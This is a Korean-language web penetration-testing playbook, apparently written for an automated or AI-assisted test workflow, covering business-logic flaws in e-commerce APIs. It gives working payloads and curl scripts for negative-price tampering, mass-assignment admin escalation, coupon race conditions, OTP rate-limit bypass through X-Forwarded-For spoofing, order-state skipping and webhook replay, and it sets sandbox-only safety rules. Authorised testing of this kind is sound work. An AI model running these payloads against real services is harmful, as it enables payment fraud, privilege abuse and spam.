### Phase 2: 동적 테스트 (검증)

**계정 요구사항:** 최소 2개 — 계정 A (리소스 소유자), 계정 B (비소유자/외부 공격자).

**[필수] 쓰기 작업 안전 수칙:**
- sandbox 도메인 한정 (prod/cbt/staging 절대 금지)
- 파괴적 행위 금지 (탈퇴, 비밀번호 변경, 이메일 변경, 실제 결제, 영구 삭제)
- 테스트 데이터 직접 생성 (기존 데이터 변경 금지)
- 결제 테스트는 PG 모킹/dry-run 확인 후만 — 미확인 시 "후보 (환경 제한)"
- 테스트 후 정리 (생성 리소스 ID 기록, role 원복)

---

## 라벨별 테스트 절차

### `PRICE_TAMPER` — 가격/수량 조작

**기본 페이로드 (request body 변조):**
```json
{"productId":"<id>","quantity":1,"price":-10000}        # 음수 금액
{"productId":"<id>","quantity":0,"price":1}             # 0 수량
{"productId":"<id>","quantity":999999999,"price":1}     # 극대값
{"productId":"<id>","quantity":0.001,"price":1}         # 소수점
{"productId":"<id>","quantity":1,"price":1,"discount":101}  # 100% 초과 할인
{"productId":"<id>","quantity":-1,"price":1}            # 음수 수량 (refund 변형)
{"productId":"<id>","quantity":1,"price":"1.0e-10"}     # 과학표기/floating point 오차
```

**우회 페이로드:**
- `currency: "KRW"` → `currency: "VND"` (환율 조작)
- 결제 콜백 가로채기 + amount 변조 (PG webhook signature 미검증)

### `PRIV_ESCALATION` — 권한 상승 (mass assignment)

**기본 페이로드:**
```json
PATCH /api/users/me  Cookie: session=USER
{"nickname":"x","role":"admin","isAdmin":true,"permissions":["ADMIN"],"is_superuser":true,"groups":["administrators"]}
```

검증:
```bash
# 본인 재로그인 또는 권한 재조회
curl -s "https://target/api/users/me" -H "Cookie: session=USER"
# admin endpoint 접근 시도
curl -si "https://target/api/admin/users" -H "Cookie: session=USER"
```

**테스트 종료 후 role 원복 필수.**

### `RACE_CONDITION` — 레이스 / TOCTOU

**기본 페이로드 (단일 Bash + 백그라운드 — 지침 5 예외):**
```bash
URL="https://target/api/coupons/apply"
SESSION="<계정A 세션>"
PAYLOAD='{"couponCode":"<선획득>"}'
TMPDIR=$(mktemp -d)

for i in $(seq 1 20); do
  curl -s -o "$TMPDIR/race_$i.body" -w "%{http_code}\n" \
    -X POST "$URL" -H "Cookie: SESSION=$SESSION" \
    -H "Content-Type: application/json" -d "$PAYLOAD" >> "$TMPDIR/race.codes" &
done
wait

echo "=== 상태코드 분포 ==="
sort "$TMPDIR/race.codes" | uniq -c

echo "=== 응답 본문 첫 줄 분포 ==="
head -n1 "$TMPDIR"/race_*.body | sort | uniq -c

# 상태 재조회
curl -s "https://target/api/users/me/coupons" -H "Cookie: SESSION=$SESSION"
```

대상: 쿠폰 1회 사용, 잔액 차감, 재고 감소, 투표/좋아요 1인 1회.

### `FEATURE_ABUSE` — Rate Limit 우회 / 기능 남용

**기본 페이로드:**
```bash
# 50회 연속 OTP 발송
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" \
    -X POST "https://target/api/auth/send-otp" \
    -H "Content-Type: application/json" \
    -d '{"phone":"<계정A 전화번호>"}'
done
```

**우회:**
- `X-Forwarded-For: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))` (IP rate limit 우회)
- 재로그인 후 카운터 초기화 확인 (세션 기반)
- 다중 sub-account/email로 분산

대상: SMS/이메일/OTP 발송, 파일 업로드, 로그인 시도. **결제/회원 탈퇴/비밀번호 변경 제외.**

### `STATE_BYPASS` — 상태 머신 우회

**기본 페이로드:**
```bash
# 1. 신규 주문 생성 (pending 상태)
curl -X POST "https://target/api/orders" -H "Cookie: SESSION=A" \
  -d '{"productId":"<id>","quantity":1}'

# 2. 중간 단계 건너뛰고 최종 단계 직접 호출
curl -X PATCH "https://target/api/orders/<orderId>" -H "Cookie: SESSION=A" \
  -d '{"status":"delivered"}'

curl -X POST "https://target/api/orders/<orderId>/complete" -H "Cookie: SESSION=A"

# 3. 재조회
curl -s "https://target/api/orders/<orderId>" -H "Cookie: SESSION=A"
```

대상: 주문/결제/승인/신청 워크플로우.

### `DATA_INTEGRITY` — 데이터 정합성

**기본 페이로드:**
```bash
# 1. 자기 자신 대상 (자기 송금/팔로우/평가)
curl -X POST "https://target/api/transfer" -H "Cookie: SESSION=A" \
  -d '{"toUserId":"<계정A userId>","amount":1000}'

# 2. 만료 쿠폰 사용
curl -X POST "https://target/api/coupons/apply" -H "Cookie: SESSION=A" \
  -d '{"couponCode":"<만료된>"}'

# 3. 동일 요청 2회 (Idempotency-Key 없이) — PG 모킹 환경 한정
curl -X POST "https://target/api/payments/charge" -H "Cookie: SESSION=A" \
  -d '{"orderId":"<orderId>","amount":1000}'
curl -X POST "https://target/api/payments/charge" -H "Cookie: SESSION=A" \
  -d '{"orderId":"<orderId>","amount":1000}'

# 4. Webhook 재전송 (외부 webhook 재처리)
curl -X POST "https://target/webhooks/payment" -H "X-Webhook-Signature: ..." \
  -d '<이전 webhook body>'
```

### `INFO_DISCLOSURE` — 비즈니스 정보 노출

**기본 페이로드:**
```bash
# 1. 계정 존재 여부 diff (별도 check endpoint 우선)
curl -s -X POST "https://target/api/auth/check-email" \
  -H "Content-Type: application/json" -d '{"email":"<이미 가입된>"}'
curl -s -X POST "https://target/api/auth/check-email" \
  -H "Content-Type: application/json" -d "{\"email\":\"nonexistent-$(date +%s)@x.com\"}"

# 2. 페이지네이션 total 노출
curl -s "https://target/api/posts?page=1&size=1" -H "Cookie: SESSION=A" \
  | grep -iE '"(total|totalCount|count|totalElements)"'

# 3. 응답에 디버그/내부 필드
curl -s "https://target/api/users/me" -H "Cookie: SESSION=A" \
  | grep -iE 'password|_debug|internal|stackTrace|hash|salt'
```

---

**우회 페이로드:**

| 라벨 | 우회 |
|---|---|
| PRICE_TAMPER | 결제 callback signature 미검증 시 amount 변조, 환율 조작 (`currency` 변경) |
| PRIV_ESCALATION | 직접 PATCH 외 batch update API, GraphQL mutation, admin invite token 재사용 |
| RACE | HTTP/2 multiplexing으로 단일 connection 다중 요청, gRPC stream 활용 |
| FEATURE_ABUSE | IP/세션/계정 분산, captcha 우회 (2captcha 같은 외부 솔버) |
| STATE_BYPASS | 단계별 trigger event를 임의 순서로, webhook 재전송 |
| DATA_INTEGRITY | Idempotency-Key 재사용 (다른 payload + 같은 key) |
| INFO_DISCLOSURE | login error message diff, signup error diff, password reset diff |

---

**참고사항:**

- 쓰기 작업 안전 수칙은 라벨별 테스트 전 반드시 확인 — sandbox 한정, 파괴적 행위 금지
- 결제 테스트는 PG 모킹/dry-run 확인 없으면 "후보 (환경 제한)" 유지, 호출 금지
- Race는 단일 Bash 호출 내부 `&`로만 병렬 (지침 5 예외)
- FEATURE_ABUSE에서 IP rate limit만 있으면 `X-Forwarded-For` 랜덤으로 우회 시도
- STATE_BYPASS는 상태 전이 순서를 사전에 Phase 1에서 캡처 필요
- PRIV_ESCALATION 후 반드시 role 원복 — 자동 실패 시 사용자 보고
- INFO_DISCLOSURE의 signup endpoint 호출 시 더미 데이터 누적 주의 — check-email 같은 별도 endpoint 우선
- 자주 놓침: batch/bulk API의 개별 검증 누락, 관리자 API의 비즈니스 규칙 우회, soft delete 우회
- Idempotency key 재사용/rotation 부재도 DATA_INTEGRITY 변형
- Webhook 재전송 (Stripe/PayPal 등)에 idempotency 미적용 시 중복 처리
- 시간대 혼동 (UTC vs local) — 쿠폰/이벤트 경계에서 영향
- Currency 단위 혼동 (원/센트) — 환율 변환 실수
- 정수 오버플로 (`Number.MAX_SAFE_INTEGER`) — JS 환경 특화
- 자기 송금/팔로우/평가는 `sender == receiver` 검증 누락이 핵심
- Race는 결과 분포 (200 응답 N개 vs 1개) + 상태 재조회로 확정
